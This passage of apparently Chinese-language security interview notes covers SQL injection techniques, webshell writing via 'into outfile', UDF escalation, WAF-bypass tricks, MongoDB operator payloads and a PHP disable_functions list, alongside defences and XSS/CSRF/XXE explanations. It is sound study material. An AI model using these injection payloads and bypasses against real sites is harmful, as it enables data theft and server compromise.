    - `left(database(),1)>'s'`
    - `ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+`
    - `ascii(substr((select database()),1,1))=98`
    - `ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))>98%23`
    - `regexp`正则注入 `select user() regexp '^[a-z]';`
    - `select user() like 'ro%'`
2. 基于报错的SQL盲注
    - `Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;  `
#### MySQL存储过程
#### 各种写shell的问题
1. 写shell用什么函数？ 
    - `select ' into outfile 'D:/shelltest.php'`
    - `dumpfile`
    - `file_put_contents`
2. outfile不能用了怎么办？ `select unhex('udf.dll hex code') into dumpfile 'c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll';`可以UDF提权 https://www.cnblogs.com/milantgh/p/5444398.html
3. dumpfile和outfile有什么不一样？outfile适合导库，在行末尾会写入新行并转义，因此不能写入二进制可执行文件。
4. sleep()能不能写shell？
5. 写shell的条件？
    - 用户权限
    - 目录读写权限
    - 防止命令执行：`disable_functions`，禁止了`disable_functions=phpinfo,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source`，但是可以用dl扩展执行命令或者ImageMagick漏洞 https://www.waitalone.cn/imagemagic-bypass-disable_function.html
    - open_basedir: 将用户可操作的文件限制在某目录下
#### 
### 注入类型
1. 基于报错注入
2. 基于布尔的注入，根据返回页面判断条件真假的注入
3. 基于时间的盲注，不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
4. 宽字节注入
5. 联合查询，可以使用 union 的情况下的注入。
6. 堆查询注入，可以同时执行多条语句的执行时的注入。
### SQL注入的原理
通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。通常未经检查或者未经充分检查的用户输入数据或代码编写问题，意外变成了代码被执行。
### 过waf
> https://blog.csdn.net/wjy397/article/details/53263281
1. 确定waf类型，狗、盾、神、锁、宝、卫士
2. 使用注释符号或者特殊符号或者多个特殊符号重复
```
# 
--
-- - //5.6.12特性，需要加空格
--+
//
/**/ //c风格注释
/**//**/  //多个注释
/*letmetest*/
;
# 科学记数法
id=0e1union select
# 空白字符
SQLite3 0A 0D 0C 09 20 
MySQL5 09 0A 0B 0C 0D A0 20 
PosgresSQL 0A 0D 0C 09 20 
Oracle 11g 00 0A 0D 0C 09 20 
MSSQL 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20
```
3. 使用sql内置函数或者关键字
> 报错注入 https://blog.csdn.net/like98k/article/details/79646512
```
# 常用
extractvalue
updatexml 报错注入
UPDATEXML (XML_document, XPath_string, new_value); 
or updatexml(1, concat(0x7e, (version()), 0x7e), 0);
> select * from  users where id = 1 and updatexml(1, concat(0x7e, (version()), 0x7e), 0);
> version() database() (SELECT concat(column_name) FROM information_schema.columns WHERE table_name='users' limit 0,1
floor()
ceil()
Mid(version(),1,1)
Substr(version(),1,1)
Substring(version(),1,1)
concat(version(),'|',user());
concat_ws('|',1,2,3)
Char(49)
Hex('a')
Unhex(61)
过滤了逗号
(1)limit处的逗号：
limit 1 offset 0
(2)字符串截取处的逗号
mid处的逗号：
mid(version() from 1 for 1)
```
4. 利用容器特性，比如iis+asp的环境可能会吞掉%(f%rom->from)造成注入，或者iis支持unicode解析，当我们请求的url存在unicode字符串的话iis会自动将其转换，但waf可能不会拦截造成注入
5. 畸形协议/请求。asp/asp.net在解析请求的时候，允许application/x-www-form-urlencoded的数据提交方式;php+apache解析协议除了get/post外随便定义协议也可能过
7. %0a换行
7. 多次URL编码，waf的一根筋过滤
```
unlencode
base64
json
binary
querystring
htmlencode
unicode
php serialize
```
8. http参数污染，`id=1&id=2&id=3` `id=1,2,3`
### 如何进行SQL注入的防御
1. 关闭应用的错误提示 
7. 加waf
2. 对输入进行过滤
3. 限制输入长度
4. 限制好数据库权限，drop/create/truncate等权限谨慎grant
5. 预编译好sql语句，python和Php中一般使用?作为占位符。这种方法是从编程框架方面解决利用占位符参数的sql注入，只能说一定程度上防止注入。还有缓存溢出、终止字符等。
6. 数据库信息加密安全（引导到密码学方面）。不采用md5因为有彩虹表，一般是一次md5后加盐再md5
7. 清晰的编程规范，结对/自动化代码 review ，加大量现成的解决方案（PreparedStatement，ActiveRecord，歧义字符过滤， 只可访问存储过程 balabala）已经让 SQL 注入的风险变得非常低了。
8. 具体的语言如何进行防注入，采用什么安全框架
> 作者：没啥意思
链接：https://www.zhihu.com/question/22953267/answer/23222069
来源：知乎
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。
> SQL注入问题既不能“靠用户（开发者也是用户）的自觉去避免”，也不能完全脱离用户（开发者也是用户）而指望数据库层面去避免。对于那些不了解SQL注入漏洞细节或不关心SQL注入漏洞或没精力去关心SQL注入漏洞的工程师，你要给他们一条尽可能简单可行透明的方案来避免SQL注入漏洞，告诉他这样写就可以了，这就是安全框架；然后告诉他或者让他的老大告诉他你必须这样写，这就是安全编码规范；然后你有手段在他没有这样写的时候能够检查出来（这比检查出漏洞要容易）并推动他改正，这就是白盒检查。
> 我们现在的互联网产品SQL注入漏洞仍然层出不穷，并不是这套思路有问题，相反恰恰是这套思路没有完善。一方面是框架方案本身不完善，以SQL注入漏洞为例，参数化是防SQL注入框架级方案的重要部分，但仅靠参数化没法很好满足开发过程中一些常见需求，如逗号分割的id列表问题、排序标记的问题等等（其实这些问题真要用参数化的方案解决也可以），使得开发更愿意在这些地方使用非参数化或伪参数化的方法（比如拼接SQL片段后再把整个片段当作参数扔进去exec）。这些问题在参数化的基础上，再加以改进，仍然守着拼接SQL片段时进行强类型转换的思路，仍然是能很好解决的，也就是继续完善参数化方案的问题，而不是看上去那样“参数化解决不了问题”。另一方面，安全编码规范的制定、培训、流程建设和实施保证上也做得远远不到位，开发leader们更希望后面的数据库或者前面的安全防御上能有手段去解决SQL注入问题，对于安全工程师来说，设置并维护几个特征串、语法分析场景也远比做那些安全框架、编码规范、白盒扫描来得要轻松实在，彼此在心照不宣中度过今天，自然不能指望明天能彻底踏实。
### mysql的网站注入，5.0以上和5.0以下有什么区别？
10年前就出了5.0，现在都到5.7了，没啥意义的问题
- 5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。
- 5.0以下是多用户单操作，5.0以上是多用户多操做。
### SQL和NoSQL的区别
SQL关系型数据库，NoSQL(Not only SQL)非关系型数据库
#### SQL优点
关系型数据库是指用关系数学模型来表示的数据，其中是以二维表的形式描述数据。
1. 结构稳定，不易修改，常用联表查询
2. 查询能力高，可以操作很复杂的查询
3. 一致性高，处理数据会使用封锁保证数据不被改变
4. 表具有逻辑性，易于理解
#### SQL缺点
1. 不适用高并发读写
2. 不适用海量数据高效读写
3. 层次多，扩展性低
4. 维护一致性开销大
5. 涉及联表查询，复杂，慢
#### NoSQL优点
采用键值对存储数据
1. 由于数据之间没有关系，所以易扩展，也易于查询
2. 数据结构灵活，每个数据都可以有不同的结构
3. 由于降低了一致性的要求，所以查询速度更快
#### 比较
非关系型数据库的产生是因为随着网站的进化，并发性增加，扩展性高，一致性要求降低。这样关系型数据库最重要的一致性维护就显得有点多余，并且消耗着性能。因此有了非关系型数据库，它可以算是关系型数据库的一种弱化的结果，在海量数据存储和查询上更胜一筹。
两种数据库没有好坏之分，只是使用的环境不一样。关系型数据库可以说是更严谨的，可靠性更强的数据库，在对于数据精度要求高的环境，比如说银行系统这样自然是像mysql这样的数据库适合。非关系型数据库胜在处理大数据的速度，但是对于数据的准确度没有那么高，对于操作量大的环境比如当前大部分web2.0的网站更加适用一些。
#### MongoDB注入方式
利用正则：找到y开头的name   `db.items.find({name: {$regex: "^y"}})`
一些payload
1. `?login[$regex]=^&password[$regex]=^`
2. `?login[$not][$type]=1&password[$not][$type]=1`
## XSS CSRF XXE
### CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？ 
> xss学习 https://www.secpulse.com/?s=+%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS+
XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。 
CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer.
XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。
### CSRF、SSRF和重放攻击有什么区别？
- CSRF是跨站请求伪造攻击，由客户端发起 
- SSRF是服务器端请求伪造，由服务器发起 
- 重放攻击是将截获的数据包进行重放，达到身份认证等目的
### 啥是同源策略，跨域有几种方式？
> http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html
浏览器安全的基石是"同源政策"，目的是为了保证用户的信息安全，防止恶意网站窃取数据，避免cookie共享。同源含义是协议、域名、端口相同的两个网页才可以共用cookie。目前如果非同源，有三种行为收到限制：